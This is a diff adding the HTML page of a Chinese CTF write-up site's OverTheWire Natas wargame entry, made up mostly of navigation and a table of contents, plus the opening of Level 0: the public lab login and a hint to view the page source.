@@ -1,0 +1,3883 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+        <meta name="author" content="YanhuiJessica">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.1, mkdocs-material-4.6.3">
+    
+    
+      
+        <title>OverTheWire：Natas</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/application.adb8469c.css">
+      
+        <link rel="stylesheet" href="../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../assets/javascripts/modernizr.86422ebf.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700%7CFira+Mono&display=fallback">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#level-0" tabindex="0" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href=".." title="Chictf-Writeups" aria-label="Chictf-Writeups" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              Chictf-Writeups
+            </span>
+            <span class="md-header-nav__topic">
+              
+                OverTheWire：Natas
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" aria-label="search" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/YanhuiJessica/Chictf-Writeups/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../index.html" class="md-tabs__link">
+          简介
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../misc/unpleasant_music.html" class="md-tabs__link">
+          Misc
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../web/t_star_upload_bypass.html" class="md-tabs__link">
+          Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../reverse/easyre.html" class="md-tabs__link">
+          Reverse
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../pwn/when_did_you_born.html" class="md-tabs__link">
+          Pwn
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../crypto/bank.html" class="md-tabs__link">
+          Crypto
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="natas.html" class="md-tabs__link md-tabs__link--active">
+          Wargames
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../eggs/ctfhub_index.html" class="md-tabs__link">
+          彩蛋
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href=".." title="Chictf-Writeups" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    Chictf-Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/YanhuiJessica/Chictf-Writeups/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    YanhuiJessica/Chictf-Writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      简介
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        简介
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../index.html" title="首页" class="md-nav__link">
+      首页
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../how_to_participate.html" title="如何参与" class="md-nav__link">
+      如何参与
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Misc
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/unpleasant_music.html" title="Unpleasant music" class="md-nav__link">
+      Unpleasant music
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/leaf_cover_eyes.html" title="一叶障目" class="md-nav__link">
+      一叶障目
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/difficult_programming_language.html" title="Difficult Programming Language" class="md-nav__link">
+      Difficult Programming Language
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/secret_information.html" title="机密信息" class="md-nav__link">
+      机密信息
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/hide_and_seek.html" title="藏藏藏" class="md-nav__link">
+      藏藏藏
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/targz_y1ng.html" title="TARGZ-y1ng" class="md-nav__link">
+      TARGZ-y1ng
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/gakki.html" title="gakki" class="md-nav__link">
+      gakki
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-8" type="checkbox" id="nav-2-8">
+    
+    <label class="md-nav__link" for="nav-2-8">
+      HackerGame 2020
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-8">
+        HackerGame 2020
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/account_bot.html" title="从零开始的记账工具人" class="md-nav__link">
+      从零开始的记账工具人
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/gibberish_message.html" title="从零开始的火星文生活" class="md-nav__link">
+      从零开始的火星文生活
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/self_repeating_repeater.html" title="自复读的复读机" class="md-nav__link">
+      自复读的复读机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/233_string_tool.html" title="233 同学的字符串工具" class="md-nav__link">
+      233 同学的字符串工具
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/233_docker.html" title="233 同学的 Docker" class="md-nav__link">
+      233 同学的 Docker
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/4f_system_middle.html" title="来自一教的图片" class="md-nav__link">
+      来自一教的图片
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/basic_math_simulator.html" title="超基础的数理模拟器" class="md-nav__link">
+      超基础的数理模拟器
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/stegano50.html" title="Stegano50" class="md-nav__link">
+      Stegano50
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../misc/newsctf_all_reverse.html" title="NEWSCTF - ！了反都，了反" class="md-nav__link">
+      NEWSCTF - ！了反都，了反
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/t_star_upload_bypass.html" title="文件上传 JS 绕过" class="md-nav__link">
+      文件上传 JS 绕过
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/t_star_tomcat.html" title="小猫咪踩灯泡" class="md-nav__link">
+      小猫咪踩灯泡
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/ctfhub_reflected_xss.html" title="CTFHub - 反射型 XSS" class="md-nav__link">
+      CTFHub - 反射型 XSS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/initiative.html" title="主动" class="md-nav__link">
+      主动
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/funhash.html" title="Funhash" class="md-nav__link">
+      Funhash
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/xss_game.html" title="XSS Game" class="md-nav__link">
+      XSS Game
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/web_php_include.html" title="Web php include" class="md-nav__link">
+      Web php include
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/ctfhub_git_leakage.html" title="CTFHub - Git 泄露" class="md-nav__link">
+      CTFHub - Git 泄露
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../web/newsctf_easy_web.html" title="NEWSCTF - easy_web" class="md-nav__link">
+      NEWSCTF - easy_web
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../reverse/easyre.html" title="EasyRe" class="md-nav__link">
+      EasyRe
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../reverse/z3.html" title="z3" class="md-nav__link">
+      z3
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../pwn/when_did_you_born.html" title="when did you born" class="md-nav__link">
+      when did you born
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Crypto
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/bank.html" title="bank" class="md-nav__link">
+      bank
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/shanghai.html" title="shanghai" class="md-nav__link">
+      shanghai
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/easy_rsa.html" title="easy_RSA" class="md-nav__link">
+      easy_RSA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/normal_rsa.html" title="Normal_RSA" class="md-nav__link">
+      Normal_RSA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/easy_ecc.html" title="easy_ECC" class="md-nav__link">
+      easy_ECC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/fanfie.html" title="fanfie" class="md-nav__link">
+      fanfie
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/jefferson_disk.html" title="转轮机加密" class="md-nav__link">
+      转轮机加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/code_modulate.html" title="编码与调制" class="md-nav__link">
+      编码与调制
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../crypto/ciscn_rsa.html" title="CISCN - rsa" class="md-nav__link">
+      CISCN - rsa
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
+    
+    <label class="md-nav__link" for="nav-7">
+      Wargames
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Wargames
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Natas
+      </label>
+    
+    <a href="natas.html" title="Natas" class="md-nav__link md-nav__link--active">
+      Natas
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-0" class="md-nav__link">
+    Level 0
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-1" class="md-nav__link">
+    Level 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    Level 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3" class="md-nav__link">
+    Level 3
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4" class="md-nav__link">
+    Level 4
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5" class="md-nav__link">
+    Level 5
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6" class="md-nav__link">
+    Level 6
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-7" class="md-nav__link">
+    Level 7
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-8" class="md-nav__link">
+    Level 8
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-9" class="md-nav__link">
+    Level 9
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10" class="md-nav__link">
+    Level 10
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-11" class="md-nav__link">
+    Level 11
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-12" class="md-nav__link">
+    Level 12
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-13" class="md-nav__link">
+    Level 13
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-14" class="md-nav__link">
+    Level 14
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-15" class="md-nav__link">
+    Level 15
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-16" class="md-nav__link">
+    Level 16
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-17" class="md-nav__link">
+    Level 17
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-18" class="md-nav__link">
+    Level 18
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-19" class="md-nav__link">
+    Level 19
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="leviathan.html" title="Leviathan" class="md-nav__link">
+      Leviathan
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
+    
+    <label class="md-nav__link" for="nav-8">
+      彩蛋
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        彩蛋
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../eggs/ctfhub_index.html" title="CTFHub - 首页" class="md-nav__link">
+      CTFHub - 首页
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../eggs/ctfhub_wechat.html" title="CTFHub - 公众号" class="md-nav__link">
+      CTFHub - 公众号
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../eggs/ctfhub_tools.html" title="CTFHub - 工具" class="md-nav__link">
+      CTFHub - 工具
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../eggs/ctfhub_match.html" title="CTFHub - 赛事" class="md-nav__link">
+      CTFHub - 赛事
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../eggs/ctfhub_exams.html" title="CTFHub - 真题" class="md-nav__link">
+      CTFHub - 真题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-0" class="md-nav__link">
+    Level 0
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-1" class="md-nav__link">
+    Level 1
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    Level 2
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3" class="md-nav__link">
+    Level 3
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4" class="md-nav__link">
+    Level 4
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5" class="md-nav__link">
+    Level 5
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6" class="md-nav__link">
+    Level 6
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-7" class="md-nav__link">
+    Level 7
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-8" class="md-nav__link">
+    Level 8
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-9" class="md-nav__link">
+    Level 9
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10" class="md-nav__link">
+    Level 10
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-11" class="md-nav__link">
+    Level 11
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-12" class="md-nav__link">
+    Level 12
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-13" class="md-nav__link">
+    Level 13
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-14" class="md-nav__link">
+    Level 14
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-15" class="md-nav__link">
+    Level 15
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-16" class="md-nav__link">
+    Level 16
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-17" class="md-nav__link">
+    Level 17
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-18" class="md-nav__link">
+    Level 18
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-19" class="md-nav__link">
+    Level 19
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+  
+
+  
+                
+                  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/natas.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>Natas</h1>
+                
+                <h2 id="level-0">Level 0<a class="headerlink" href="#level-0" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas0</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>natas0</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas0.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>提示：<code>You can find the password for the next level on this page.</code></li>
+<li>使用开发者工具查看页面源代码即可获得下一关的口令<br>
